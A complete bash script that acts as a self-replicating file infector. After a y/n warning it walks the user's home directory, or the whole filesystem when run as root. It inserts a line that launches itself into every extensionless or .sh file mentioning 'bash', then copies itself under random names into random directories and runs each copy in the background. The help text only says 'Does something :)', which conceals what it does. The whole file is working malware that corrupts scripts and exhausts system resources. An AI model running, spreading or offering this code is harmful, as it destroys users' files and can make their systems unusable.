#!/usr/bin/env bash

# Exit if any piped command fails
set -o pipefail

# If the script is not run as root
if [[ ${EUID} -ne 0 ]]; then
	echo -e "This script will lock up your system and... \nmost likely cause semi irreversible damage to all the scripts in ${HOME}, no matter how \"beefy\" it is. \nAre you sure you want to continue? (y/n)"
	read -r answer
	if [[ ${answer} == "y" ]]; then
		target="${HOME}"
	else
		echo "Exiting..."
		exit 1
	fi
else
	echo -e "This script is dangerous and may cause irreversible damage to your system. \nAre you sure you want to continue? (y/n)"
	read -r answer
	if [[ ${answer} == "y" ]]; then
		target="/"
	else
		echo "Exiting..."
		exit 1
	fi
fi

word="bash"
script_path=$(readlink -f "$0")
line="(${script_path}) &"

check_for_bash_in_file() {
	# Find all files lacking file extension aswell as files with the .sh extension in the target directory
	find "${target}" -type f \( -name "*.sh" -o ! -name "*.*" \) -print0 | while IFS= read -r -d '' file; do
		# If the file contains the word "bash"
		if grep -q "${word}" "${file}"; then
			# Append the line to the file
			append_line_to_file "${file}"
		fi
	done
	# Clone the script under a random name
	clone_file_under_random_name
}

append_line_to_file() {
	# If the file is not the script itself
	if ! cmp -s "${file}" "${script_path}"; then
		# If the file does not contain the line
		if ! grep -Fxq "${line}" "${file}"; then
			sed -i '2{/^$/d}' "${file}"  # If the second line is empty, delete it
			sed -i "2i${line}" "${file}" # Insert the new line at the second line
		fi
	fi
}

clone_file_under_random_name() {
	# Find all directories in the target directory
	find_output=$(find "${target}" -type d 2>/dev/null) || exit 1
	IFS=$'\n' read -d '' -r -a directories <<<"${find_output}"

	# Select a random directory from the array unless the array is empty
	if ! dir=${directories[RANDOM % ${#directories[@]}]}; then
		# If the array is empty, use the target directory
		dir="${target}"
	fi
	# Create a temporary file in the random directory
	random_dir=$(mktemp -d "${dir}/XXXXXXXXXXXX")

	# Copy the script to the temporary file and make it executable
	random_file=$(mktemp "${random_dir}/XXXXXXXXXXXX")
	cp "${script_path}" "${random_file}" && chmod +x "${random_file}"

	# Run the script
	next_file=$(readlink -f "${random_file}")
	nohup "${next_file}" >/dev/null 2>&1 &
}

# Run and disown the function in the background
case "${1}" in
--help)
	echo "Usage: ${0} [OPTION]..."
	echo "Does something :)"
	echo
	echo "  --help		display this help and exit"
	echo
	exit 0
	;;
*)
	(check_for_bash_in_file) &
	;;
esac
